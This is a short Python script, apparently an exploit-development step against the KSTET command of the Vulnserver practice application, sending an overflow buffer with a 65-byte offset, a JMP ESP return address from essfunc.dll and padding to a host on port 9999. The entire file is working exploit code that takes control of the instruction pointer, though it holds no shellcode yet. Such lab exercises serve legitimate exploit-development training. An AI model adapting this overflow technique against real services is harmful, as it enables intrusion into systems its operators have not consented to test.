import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#debug breakpoint jmp esp 625011af essfunc.dll

buffer = "KSTET /.:/ " + "A"*65+ "\xaf\x11\x50\x62" + "X"*4900

s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()